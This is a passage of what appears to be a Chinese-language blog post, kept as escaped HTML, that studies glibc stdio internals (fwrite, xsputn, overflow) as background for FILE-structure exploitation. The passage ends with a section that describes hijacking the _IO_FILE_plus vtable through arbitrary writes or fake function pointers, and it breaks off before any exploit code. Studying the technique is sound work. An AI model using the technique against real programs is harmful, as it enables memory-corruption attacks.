class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;_IO_size_t&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_IO_fwrite (&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _IO_size_t request = size * count;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _IO_size_t written = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  CHECK_FILE (fp, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (request == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _IO_acquire_lock (fp);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (_IO_vtable_offset (fp) != &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; || _IO_fwide (fp, &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;) == &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    written = _IO_sputn (fp, (&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *) buf, request);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _IO_release_lock (fp);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;/* We have written all of the input in case the return value indicates&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;     this or EOF is returned.  The latter is a special case where we&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;     simply did not manage to flush the buffer.  But the data is in the&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;     buffer and therefore written as far as fwrite is concerned.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (written == request || written == EOF)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; count;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; written / size;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_hidden_def (_IO_fwrite)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		主要调用了  _IO_sputn 来实现写入的功能,  _IO_sputn 位于  _IO_FILE_plus 的 vtable 中，调用这个函数需要首先取出 vtable 中的指针，再跳过去进行调用。 &lt;font color=&#34;red&#34;&gt;它对应了函数 _IO_new_file_xsputn,咋对应的…&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;fileops.c&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;_IO_size_t&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_IO_new_file_xsputn (_IO_FILE *f, &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *data, _IO_size_t n)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *s = (&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *) data;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _IO_size_t to_do = n;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; must_flush = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _IO_size_t count = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (n &amp;lt;= &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;/* This is an optimized implementation.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;     If the amount to be written straddles a block boundary&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;     (or the filebuf is unbuffered), use sys_write directly. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;/* First figure out how much space is available in the buffer. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ((f-&amp;gt;_flags &amp;amp; _IO_LINE_BUF) &amp;amp;&amp;amp; (f-&amp;gt;_flags &amp;amp; _IO_CURRENTLY_PUTTING))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      count = f-&amp;gt;_IO_buf_end - f-&amp;gt;_IO_write_ptr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (count &amp;gt;= n)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *p;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (p = s + n; p &amp;gt; s; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (*--p == &lt;span class=&#34;string&#34;&gt;&amp;#x27;\n&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		  count = p - s + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		  must_flush = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		  &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (f-&amp;gt;_IO_write_end &amp;gt; f-&amp;gt;_IO_write_ptr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    count = f-&amp;gt;_IO_write_end - f-&amp;gt;_IO_write_ptr; &lt;span class=&#34;comment&#34;&gt;/* Space available. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;/* Then fill the buffer. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (count &amp;gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (count &amp;gt; to_do)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	count = to_do;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;ifdef&lt;/span&gt; _LIBC&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      f-&amp;gt;_IO_write_ptr = __mempcpy (f-&amp;gt;_IO_write_ptr, s, count);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;memcpy&lt;/span&gt; (f-&amp;gt;_IO_write_ptr, s, count);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      f-&amp;gt;_IO_write_ptr += count;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      s += count;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      to_do -= count;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (to_do + must_flush &amp;gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      _IO_size_t block_size, do_write;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;comment&#34;&gt;/* Next flush the (full) buffer. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (_IO_OVERFLOW (f, EOF) == EOF)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;comment&#34;&gt;/* If nothing else has to be written we must not signal the&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;	   caller that everything has been written.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; to_do == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; ? EOF : n - to_do;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;comment&#34;&gt;/* Try to maintain alignment: write a whole number of blocks.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      block_size = f-&amp;gt;_IO_buf_end - f-&amp;gt;_IO_buf_base;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      do_write = to_do - (block_size &amp;gt;= &lt;span class=&#34;number&#34;&gt;128&lt;/span&gt; ? to_do % block_size : &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (do_write)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  count = new_do_write (f, s, do_write);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  to_do -= count;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (count &amp;lt; do_write)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; n - to_do;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;comment&#34;&gt;/* Now write out the remainder.  Normally, this will fit in the&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;	 buffer, but it&amp;#x27;s somewhat messier for line-buffered files,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;	 so we let _IO_default_xsputn handle the general case. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (to_do)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	to_do -= _IO_default_xsputn (f, s+do_write, to_do);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; n - to_do;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_hidden_ver (_IO_new_file_xsputn, _IO_file_xsputn)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		这里主要会调用同样位于vtable中的_IO_OVERFLOW,对应函数是 _IO_new_file_overflow&lt;/p&gt;
&lt;p&gt;fileops.c&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_IO_new_file_overflow (_IO_FILE *f, &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; ch)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;...........&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (ch == EOF)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; _IO_do_write (f, f-&amp;gt;_IO_write_base,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			 f-&amp;gt;_IO_write_ptr - f-&amp;gt;_IO_write_base);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (f-&amp;gt;_IO_write_ptr == f-&amp;gt;_IO_buf_end ) &lt;span class=&#34;comment&#34;&gt;/* Buffer is really full */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (_IO_do_flush (f) == EOF)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; EOF;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;..........&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		在这里会最终调用write系统调用&lt;/p&gt;
&lt;h2 id=&#34;fclose&#34;&gt;&lt;a href=&#34;#fclose&#34; class=&#34;headerlink&#34; title=&#34;fclose&#34;&gt;&lt;/a&gt;fclose&lt;/h2&gt;&lt;h2 id=&#34;伪造-劫持&#34;&gt;&lt;a href=&#34;#伪造-劫持&#34; class=&#34;headerlink&#34; title=&#34;伪造 劫持&#34;&gt;&lt;/a&gt;伪造 劫持&lt;/h2&gt;&lt;p&gt;​		vtable 劫持分为两种，一种是直接改写 vtable 中的函数指针，&lt;strong&gt;通过任意地址写就可以实现&lt;/strong&gt;。另一种是覆盖 vtable 的指针指向我们控制的内存，然后在其中布置函数指针。&lt;/p&gt;
&lt;p&gt;​		伪造 vtable 劫持程序流程的中心思想就是针对_IO_FILE_plus 的 vtable 动手脚，通过把 vtable 指向我们控制的内存，并在其中布置函数指针来实现。	&lt;/p&gt;
&lt;p&gt;奇怪,必须要加\n , 和缓冲区刷新有关&lt;/p&gt;
&lt;p&gt;gcc -g 可以在调试的时候….&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span 